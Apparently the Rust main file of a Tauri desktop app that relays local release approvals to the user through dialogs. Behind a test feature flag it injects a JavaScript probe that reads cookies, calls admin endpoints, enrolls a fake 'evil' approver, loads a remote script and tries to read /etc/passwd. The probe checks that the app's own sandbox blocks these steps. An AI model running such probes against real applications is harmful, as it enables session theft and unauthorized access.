use serde_json::Value;
use std::time::{Duration, Instant};
use tauri::{Manager, WebviewUrl, WebviewWindowBuilder};
use tauri_plugin_dialog::{DialogExt, MessageDialogButtons};

fn admin(dir: &std::path::Path) -> Result<(u16, String), String> {
    let v: Value = serde_json::from_str(&std::fs::read_to_string(dir.join("admin.json")).map_err(|e| e.to_string())?).map_err(|e| e.to_string())?;
    Ok((v["port"].as_u64().ok_or("port")? as u16, v["token"].as_str().ok_or("token")?.to_string()))
}

fn call(port: u16, token: &str, method: &str, path: &str, body: Option<Value>) -> Result<Value, String> {
    let agent: ureq::Agent = ureq::Agent::config_builder().http_status_as_error(false).build().into();
    let url = format!("http://127.0.0.1:{port}{path}");
    let mut r = if method == "GET" {
        agent.get(&url).header("Authorization", &format!("Bearer {token}")).call()
    } else {
        agent.post(&url).header("Authorization", &format!("Bearer {token}")).send_json(body.unwrap_or(Value::Null))
    }
    .map_err(|e| e.to_string())?;
    r.body_mut().read_json().map_err(|e| e.to_string())
}

#[cfg(feature = "attack-test")]
const ATTACK_JS: &str = r#"(async () => { const out = {}; try {
  out.cookie = document.cookie;
  out.storage = [Object.keys(localStorage).length, Object.keys(sessionStorage).length];
  const st = async (u, o) => { try { return (await fetch(u, o)).status; } catch (e) { return "blocked"; } };
  out.adminList = await st("/admin/approvals");
  out.adminJobs = await st("/admin/jobs", { method: "POST", headers: { "content-type": "application/json" }, body: "{}" });
  out.approverEnroll = await st("/admin/approvers", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ public_key: "x", label: "evil" }) });
  out.logExport = await st("/admin/log");
  const s = document.createElement("script"); s.textContent = "window.__injected = 1"; document.head.appendChild(s);
  out.inlineScript = window.__injected === 1 ? "ran" : "blocked";
  try { out.evalWorks = String(eval("1+1")); } catch (e) { out.evalWorks = "blocked"; }
  try { out.fn = String(new Function("return 7")()); } catch (e) { out.fn = "blocked"; }
  out.exfil = await new Promise((r) => { const i = new Image(); i.onload = () => r("loaded"); i.onerror = () => r("blocked"); i.src = "http://127.0.0.1:1/x.png"; });
  out.remoteScript = await new Promise((r) => { const sc = document.createElement("script"); sc.src = "https://example.com/x.js"; sc.onload = () => r("loaded"); sc.onerror = () => r("blocked"); document.head.appendChild(sc); });
  out.cross = await fetch("https://example.com/", { mode: "no-cors" }).then(() => "sent", () => "blocked");
  out.tauriGlobal = typeof window.__TAURI__;
  out.internals = typeof window.__TAURI_INTERNALS__;
  const inv = window.__TAURI_INTERNALS__ && window.__TAURI_INTERNALS__.invoke;
  const tryInvoke = async (cmd, args) => { if (!inv) return "no-bridge"; try { await inv(cmd, args); return "ALLOWED"; } catch (e) { return "refused"; } };
  out.ipcDialog = await tryInvoke("plugin:dialog|message", { message: "x" });
  out.ipcWindow = await tryInvoke("plugin:window|close", { label: "main" });
  out.ipcApp = await tryInvoke("plugin:app|version", {});
  out.ipcFs = await tryInvoke("plugin:fs|read_text_file", { path: "/etc/passwd" });
  out.ipcCustom = await tryInvoke("greet", { name: "x" });
  out.opens = [window.open("https://example.com/"), window.open("file:///etc/passwd"), window.open(location.origin + "/")].map((w) => w === null);
  } catch (e) { out.error = String(e); }
  location.hash = "ATTACK:" + encodeURIComponent(JSON.stringify(out));
})()"#;

#[cfg(feature = "attack-test")]
fn unescape(s: &str) -> String {
    let b = s.as_bytes();
    let mut out = Vec::new();
    let mut i = 0;
    while i < b.len() {
        if b[i] == b'%' && i + 2 < b.len() + 0 && i + 2 <= b.len() - 1 {
            if let Ok(v) = u8::from_str_radix(&s[i + 1..i + 3], 16) {
                out.push(v);
                i += 3;
                continue;
            }
        }
        out.push(b[i]);
        i += 1;
    }
    String::from_utf8_lossy(&out).into_owned()
}

#[cfg(feature = "attack-test")]
fn run_attacks(handle: tauri::AppHandle, origin: String) {
    std::thread::spawn(move || {
        let Some(w) = handle.get_webview_window("main") else { return };
        std::thread::sleep(Duration::from_millis(2500));
        let _ = w.eval(ATTACK_JS);
        let mut got = None;
        for _ in 0..500 {
            std::thread::sleep(Duration::from_millis(20));
            if let Ok(u) = w.url() {
                if let Some(f) = u.fragment().and_then(|f| f.strip_prefix("ATTACK:")) {
                    got = Some(unescape(f));
                    break;
                }
            }
        }
        println!("ATTACK_RESULT {}", got.unwrap_or_else(|| "null".into()));
        println!("WINDOWS {}", handle.webview_windows().len());
        for target in ["file:///etc/passwd", "https://example.com/", "javascript:alert(1)", "data:text/html,<p>x</p>", "about:blank", "blob:http://x/y", "view-source:http://127.0.0.1/"] {
            let _ = w.eval(&format!("try {{ location.href = {target:?}; }} catch (e) {{}}"));
            std::thread::sleep(Duration::from_millis(1500));
            let url = w.url().map(|u| u.to_string()).unwrap_or_default();
            let stayed = url.starts_with(&origin);
            println!("NAV {target} {} {url}", if stayed { "stayed" } else { "LEFT" });
            if !stayed {
                let _ = w.eval(&format!("location.href = {origin:?}"));
                std::thread::sleep(Duration::from_millis(1500));
            }
        }
        println!("ATTACKS_DONE");
        handle.exit(0);
    });
}

fn main() {
    let started = Instant::now();
    let data = std::env::var("KAKUREGA_DATA_DIR").expect("KAKUREGA_DATA_DIR");
    let data = std::path::PathBuf::from(data);
    tauri::Builder::default()
        .plugin(tauri_plugin_dialog::init())
        .setup(move |app| {
            let (port, token) = admin(&data)?;
            let code = call(port, &token, "POST", "/admin/pairing", Some(serde_json::json!({})))?["code"].as_str().ok_or("code")?.to_string();
            let origin = format!("http://127.0.0.1:{port}");
            let nav_origin = origin.clone();
            let url = format!("{origin}/#pair={code}").parse().map_err(|e: url::ParseError| e.to_string())?;
            let window = WebviewWindowBuilder::new(app, "main", WebviewUrl::External(url))
                .title("Kakurega")
                .inner_size(1180.0, 820.0)
                .on_navigation(move |u| u.as_str().starts_with(&nav_origin))
                .on_page_load(move |_w, payload| {
                    if matches!(payload.event(), tauri::webview::PageLoadEvent::Finished) {
                        println!("LOAD_MS {}", started.elapsed().as_millis());
                    }
                })
                .build()?;
            let handle = app.handle().clone();
            std::thread::spawn(move || {
                let mut ready = false;
                let mut seen: Vec<String> = Vec::new();
                loop {
                    std::thread::sleep(Duration::from_millis(20));
                    if !ready {
                        if let Some(w) = handle.get_webview_window("main") {
                            if w.title().map(|t| t == "READY").unwrap_or(false) {
                                println!("READY_MS {}", started.elapsed().as_millis());
                                ready = true;
                            }
                        }
                    }
                    if ready {
                        break;
                    }
                }
                loop {
                    std::thread::sleep(Duration::from_millis(1000));
                    let Ok(list) = call(port, &token, "GET", "/admin/approvals", None) else { continue };
                    for item in list["approvals"].as_array().cloned().unwrap_or_default() {
                        let Some(id) = item["id"].as_str().map(str::to_string) else { continue };
                        if seen.contains(&id) {
                            continue;
                        }
                        seen.push(id.clone());
                        let Ok(d) = call(port, &token, "GET", &format!("/admin/approvals/{id}"), None) else { continue };
                        let digest = d["digest"].as_str().unwrap_or("").to_string();
                        let text = format!("Recipient: {}\nDigest: {}\nFiles: {}", d["recipient"].as_str().unwrap_or("?"), digest, d["files"].as_array().map(|a| a.len()).unwrap_or(0));
                        let yes = handle.dialog().message(text).title("Approve release").buttons(MessageDialogButtons::OkCancelCustom("Approve".into(), "Refuse".into())).blocking_show();
                        if yes {
                            let _ = call(port, &token, "POST", &format!("/admin/approvals/{id}/approve"), Some(serde_json::json!({"ack": digest.chars().take(12).collect::<String>()})));
                        } else {
                            let _ = call(port, &token, "POST", &format!("/admin/approvals/{id}/deny"), Some(serde_json::json!({})));
                        }
                    }
                }
            });
            #[cfg(feature = "attack-test")]
            run_attacks(app.handle().clone(), origin.clone());
            let _ = window;
            Ok(())
        })
        .run(tauri::generate_context!())
        .expect("run");
}
